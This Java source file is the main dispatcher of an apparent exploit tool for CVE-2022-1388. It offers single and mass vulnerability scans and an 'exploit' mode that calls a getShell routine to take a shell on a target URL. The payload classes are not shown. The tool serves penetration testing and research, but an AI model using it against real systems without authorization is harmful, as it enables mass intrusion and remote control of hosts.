import java.io.IOException;
import java.util.Scanner;

public class main {

	public static void single(String target) throws Exception {

		singleCheck sc = new singleCheck(target);
		sc.testTarget();
		sc.vulnCheck();

	}

	public static void massive(String filePath) throws Exception {

		massiveCheck mcheck = new massiveCheck(filePath);
		mcheck.readFile();

	}

	public static void exploit(String target) throws IOException {

		getShell shell = new getShell(target);
		shell.pwnShell();

	}

	public static void checkInput(String type) throws Exception {
		Scanner s = new Scanner(System.in);
		if (type.equals("scheck")) {
			System.out.println("Enter target URL:");
			String target = s.nextLine();
			System.out.println("[+] Start scan on " + target);
			single(target);

		} else if (type.equals("mcheck")) {
			System.out.println("Enter file path:");
			String target = s.nextLine();
			System.out.println("[+] Start scan on massive targets");
			massive(target);

		} else if (type.equals("exploit")) {
			System.out.println("Enter target URL:");
			String target = s.nextLine();
			System.out.println("[+] Start exploiting " + target);
			exploit(target);

		} else if (type.equals("help")) {
			System.out.println("Scan a single target: java -jar cve-2022-1388.jar scheck");
			System.out.println("Scan targets from a file: java -jar cve-2022-1388.jar mcheck");
			System.out.println("Exploit a target: java -jar cve-2022-1388.jar exploit");
			System.exit(0);

		} else {
			System.out.println("[!] Invalid option");
			System.out.println("Use help option for information e.x: java -jar cve-2022-1388.jar help");
		}
		s.close();

	}

	public static void main(String[] args) throws Exception {
		System.out.println("@Author: Zeyad Azima and Morad Abdelrasheed");
		System.out.println("");
		try {
			String option = args[0];
			checkInput(option);
		} catch (ArrayIndexOutOfBoundsException e) {
			System.out.println("[!] No arguments passed");
			System.out.println("Use help option for information e.x: cve-2022-1388.jar help");
		}
	}

}
